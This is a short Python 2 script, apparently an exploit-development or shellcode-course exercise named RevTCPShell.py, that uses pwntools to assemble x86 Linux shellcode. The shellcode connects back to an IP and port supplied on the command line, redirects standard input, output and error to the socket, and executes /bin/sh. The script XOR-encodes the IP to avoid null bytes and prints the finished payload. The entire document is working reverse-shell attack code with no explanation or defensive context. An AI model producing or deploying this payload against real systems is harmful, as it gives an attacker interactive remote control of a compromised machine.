#!/usr/bin/env python
from pwn import *

sh = asm("""
    mov   ebp, esp
    xor   eax, eax
    xor   ecx, ecx
    xor   edx, edx
    push  eax
    push  eax             
    mov   eax, 0xffffffff
    mov   ebx, 0xfeffff80
    xor   ebx, eax
    push  ebx             
    pushw 0x5c11
    pushw 0x02
    xor   eax, eax
    xor   ebx, ebx
    mov   ax, 0x167       
    mov   bl, 0x02        
    mov   cl, 0x01        
    int   0x80
    mov   ebx, eax        
    mov   ax, 0x16a
    mov   ecx, esp
    mov   edx, ebp
    sub   edx, esp
    int   0x80
    xor   ecx, ecx
    mov   cl, 0x3
    dup:
    xor   eax, eax
    mov   al, 0x3f
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup
    xor   eax, eax
    xor   edx, edx
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp
    mov   al, 0x0b
    int   0x80
""")

def sh2str(sh):
    payload = ''
    for i in range(len(sh)):
        c = str(hex(ord(sh[i])))[2:]
        if len(c) == 1:
            c = '\\x0' + c
        else:
            c = '\\x' + c

        payload += c

    return payload

def xor_ip(ip):
    tmp = sh2str(ip).replace('\\','0')
    payload = ''
    for i in range(4):
        ip_bytes = hex(int(tmp[0+i*4:4+i*4],16) ^ 0xff)
        payload += str(ip_bytes)
    payload = payload.replace('0x','\\x')

    return payload

if len(sys.argv) < 3:
    print 'Usage: ./RevTCPShell.py <IP> <Port>'
    exit(1)

shellcode = sh2str(sh)
ip = xor_ip(socket.inet_aton(sys.argv[1]))

shellcode = shellcode.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb{b1}{b2}{b3}{b4}".format(
    b1 = ip[0:4],
    b2 = ip[4:8],
    b3 = ip[8:12],
    b4 = ip[12:16]
))

port = hex(socket.htons(int(sys.argv[2])))
sh = shellcode.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6],b2 = port[2:4]))

print sh








